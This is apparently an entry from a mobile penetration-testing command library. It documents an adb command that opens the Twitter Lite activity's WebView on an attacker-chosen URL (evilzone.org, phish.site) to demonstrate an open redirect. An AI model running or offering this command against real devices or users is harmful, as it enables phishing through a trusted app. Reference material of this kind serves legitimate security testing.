---
data: >-
  adb shell am start -n
  com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d
  "http://evilzone.org"
tags:
  - adb
  - intent
  - open-redirect
type: command
output: App loads the malicious external site
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.825Z'
id: 642c9b5f-c710-45f3-97df-6846b718f6ec
verified: false
validated: true
submitted: true
---
# adb-start-twitterlite-with-http-redirect

## Command

```bash
adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "http://evilzone.org"
```

## Description

Triggers an open redirect by loading an arbitrary HTTP URL in the activity's WebView.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Component specifier | Yes |
| -d | External URL | Yes |

## Examples

### Basic Usage

```bash
adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "http://evilzone.org"
```

### Advanced Usage

Use HTTPS or other schemes if supported: -d "https://phish.site"

## Expected Output

WebView navigates to the specified site.

## Related

- [[commands/adb-start-twitterlite-with-file-uri]]
- [[procedures/Trigger-Open-Redirect-via-http-URI-in-TwitterLiteActivity]]
